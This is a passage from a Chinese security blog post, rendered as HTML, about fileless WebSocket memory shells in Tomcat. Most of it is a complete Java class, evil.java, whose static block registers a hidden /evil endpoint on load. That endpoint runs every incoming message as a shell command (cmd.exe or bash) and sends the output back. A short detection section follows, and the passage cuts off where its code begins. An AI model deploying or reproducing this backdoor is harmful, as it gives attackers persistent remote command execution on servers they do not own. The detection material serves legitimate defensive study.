&lt;ol&gt;
&lt;li&gt;获取当前的StandardContext&lt;/li&gt;
&lt;li&gt;通过StandardContext获取ServerContainer&lt;/li&gt;
&lt;li&gt;定义一个恶意类，并创建一个ServerEndpointConfig，给这个恶意类分配URI path&lt;/li&gt;
&lt;li&gt;调用ServerContainer.addEndpoint方法，将创建的ServerEndpointConfig添加进去&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;n&#34;&gt;ServerContainer&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;container&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ServerContainer&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;req&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getServletContext&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;().&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getAttribute&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ServerContainer&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getName&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;());&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;ServerEndpointConfig&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;config&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ServerEndpointConfig&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;Builder&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;create&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;evil&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;/ws&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;).&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;build&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;container&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;addEndpoint&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;config&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;demo&#34;&gt;demo&lt;/h3&gt;
&lt;p&gt;将注入内存马的操作放在static块，加载这个类即可实现内存马注入&lt;/p&gt;
&lt;p&gt;evil.java:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;47
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;48
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;49
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;50
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;51
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;52
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;53
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;54
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;55
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;56
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;57
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;org.apache.catalina.core.StandardContext&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;org.apache.catalina.loader.WebappClassLoaderBase&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;org.apache.tomcat.websocket.server.WsServerContainer&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;

&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;javax.websocket.*&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;javax.websocket.server.ServerContainer&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;javax.websocket.server.ServerEndpointConfig&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;java.io.InputStream&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;

&lt;span class=&#34;kd&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;evil&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;extends&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Endpoint&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;implements&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;MessageHandler&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;Whole&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;kd&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;WebappClassLoaderBase&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;webappClassLoaderBase&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;WebappClassLoaderBase&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Thread&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;currentThread&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;().&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getContextClassLoader&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;StandardContext&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;standardContext&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;StandardContext&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;webappClassLoaderBase&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getResources&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;().&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getContext&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;ServerEndpointConfig&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;build&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ServerEndpointConfig&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;Builder&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;create&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;evil&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;/evil&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;).&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;build&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;WsServerContainer&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;attribute&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;WsServerContainer&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;standardContext&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getServletContext&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;().&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getAttribute&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ServerContainer&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getName&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;());&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;try&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
            &lt;span class=&#34;n&#34;&gt;attribute&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;addEndpoint&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;build&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
            &lt;span class=&#34;c1&#34;&gt;// System.out.println(&amp;#34;ok!&amp;#34;);
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;catch&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;DeploymentException&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
            &lt;span class=&#34;k&#34;&gt;throw&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;RuntimeException&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;

    &lt;span class=&#34;kd&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Session&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;session&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;

    &lt;span class=&#34;kd&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;onMessage&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;String&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;message&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;try&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
            &lt;span class=&#34;kt&#34;&gt;boolean&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;iswin&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;System&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getProperty&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;os.name&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;).&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;toLowerCase&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;().&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;startsWith&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;windows&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
            &lt;span class=&#34;n&#34;&gt;Process&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;exec&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
            &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;iswin&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
                &lt;span class=&#34;n&#34;&gt;exec&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Runtime&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getRuntime&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;().&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;exec&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[]{&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;cmd.exe&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;/c&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;message&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;});&lt;/span&gt;
            &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
                &lt;span class=&#34;n&#34;&gt;exec&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Runtime&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getRuntime&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;().&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;exec&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[]{&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;/bin/bash&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;-c&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;message&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;});&lt;/span&gt;
            &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;

            &lt;span class=&#34;n&#34;&gt;InputStream&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ips&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;exec&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getInputStream&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
            &lt;span class=&#34;n&#34;&gt;StringBuilder&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;sb&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;StringBuilder&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;

            &lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
            &lt;span class=&#34;k&#34;&gt;while&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ips&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;read&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;())&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!=&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
                &lt;span class=&#34;n&#34;&gt;sb&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;append&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
            &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;

            &lt;span class=&#34;n&#34;&gt;ips&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;close&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
            &lt;span class=&#34;n&#34;&gt;exec&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;waitFor&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
            &lt;span class=&#34;k&#34;&gt;this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;session&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getBasicRemote&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;().&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;sendText&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sb&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;toString&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;());&lt;/span&gt;
        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;catch&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Exception&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
            &lt;span class=&#34;n&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;printStackTrace&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;

    &lt;span class=&#34;nd&#34;&gt;@Override&lt;/span&gt;
    &lt;span class=&#34;kd&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;onOpen&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Session&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;session&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;EndpointConfig&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;config&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;session&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;session&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;session&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;addMessageHandler&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;效果：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/Anthem-whisper/imgbed/master/img/202207191826978.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;websocket内存马的检测方法&#34;&gt;WebSocket内存马的检测方法&lt;/h2&gt;
&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/Anthem-whisper/imgbed/master/img/202207200104113.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;addEndpoint之后，可以在wsServerContainer里面有个configExactMatchMap属性里面找到Endpoint&lt;/p&gt;
&lt;p&gt;只需要想办法拿到这个configExactMatchMap里面的config，然后就可以调用getPath等方法就可以拿到endpoint的各种属性，以此来判别是否为内存马&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
